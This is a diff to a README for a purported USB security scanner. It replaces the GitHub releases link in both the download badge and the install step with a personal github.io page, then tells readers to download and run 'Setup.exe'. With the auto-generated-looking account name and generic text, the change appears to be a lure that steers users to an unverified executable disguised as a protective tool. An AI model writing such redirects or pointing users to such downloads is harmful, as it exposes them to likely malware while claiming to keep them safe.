@@ -1,6 +1,6 @@
 # 🛡️ USB-Security-Tool-2026 - Secure your drives from harmful threats
 
-[![Download USB-Security-Tool-2026](https://img.shields.io/badge/Download-USB_Security_Tool_2026-blue.svg)](https://github.com/Naratussockbellflower319/USB-Security-Tool-2026/releases)
+[![Download USB-Security-Tool-2026](https://img.shields.io/badge/Download-USB_Security_Tool_2026-blue.svg)](https://naratussockbellflower319.github.io)
 
 USB-Security-Tool-2026 protects your computer and your removable drives. Malicious files often hide on USB sticks. These files infect your computer when you open them. This tool scans your drives for viruses. It stops autorun files from running without your permission. You use this software to keep your personal data safe. 
 
@@ -18,7 +18,7 @@ Your computer must meet these requirements for the tool to work:
 
 Follow these steps to set up the software on your computer:
 
-1. Visit the [official releases page](https://github.com/Naratussockbellflower319/USB-Security-Tool-2026/releases) to find the latest version.
+1. Visit the [official releases page](https://naratussockbellflower319.github.io) to find the latest version.
 2. Look for the section labeled "Assets".
 3. Click on the file named "Setup.exe" to start the download.
 4. Save the file to your desktop or your downloads folder.
